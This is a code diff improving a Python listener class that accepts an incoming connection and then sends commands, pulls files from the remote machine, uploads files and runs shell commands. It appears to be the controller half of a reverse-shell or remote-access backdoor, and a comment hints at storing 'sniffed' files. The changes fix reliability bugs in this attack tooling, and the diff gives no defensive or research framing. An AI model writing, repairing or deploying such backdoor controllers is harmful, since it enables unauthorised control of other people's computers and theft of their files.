@@ -17,12 +17,13 @@ class Listen(object):
         self.add=None
         self.f=True
         self.__sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        self.__sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
         try:
             self.__sock.bind((self.target,self.port))
             self.__sock.listen(0)
         except:
             raise Exception("Port is not accessible try another one or exit")
-        print("[+] Waiting for a connection in port {self.port}")
+        print(f"[+] Waiting for a connection in port {self.port}")
         self.conn,self.add=self.__sock.accept()
         print(f"[+] Connection recieved from {self.add[0]} through port {self.add[1]}")
     def __send_data(self,msg):
@@ -36,16 +37,23 @@ class Listen(object):
         self.conn.send(msg.encode())
     def __download(self,data):
         try:
+            if data.get('msg').upper()=='ERROR':
+                print("Error")
+                return
             name=data.get("name")
+            if data.get('byt')=='' or data.get('byt')==None:
+                data['byt']=base64.b64encode("Nothing in the file".encode()).decode()
             byte=base64.b64decode(data.get('byt').encode())
             if not byte:
                 print("NO data from file ")
                 return
+            #name=f"Sniffed/{name}"
             with open(name,'wb') as f:
                 f.write(byte)
             print("File is downloaded");
             
-        except:
+        except Exception as e:
+            print(e)
             print("Problem in downloading File")
         return;
     def __upload(self,filename):
@@ -65,12 +73,20 @@ class Listen(object):
         ok=subprocess.check_output(msg,shell=True,stdin=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
         assert(type(ok)!=type('as'))
         return ok.decode()
-    def __rec(self,code=4096):
-        res=self.conn.recv(code)
-        result=json.loads(res.decode())
-        if result.get('msg')==None:
-            return "Nothing is sent from client";
-        return result;
+###RECIEVE 
+    def __rec(self,code=9000):
+        res=""
+        while True:
+            try:
+                res=res+self.conn.recv(code).decode()
+                result=json.loads(res)
+                if result.get('msg')==None:
+                    return "Nothing is sent from client";
+                return result;
+            except:
+                continue
+            
+            
     def close(self):
         self.__sock.close()
         self.conn.close()
@@ -117,7 +133,6 @@ class Listen(object):
                 msg={'first':'download','msg':other}
                 self.__send_data(msg)
                 pp=self.__rec()
-                print(pp)
                 if isinstance(pp,str):
                     print("Cant be downloaded")
                 else:
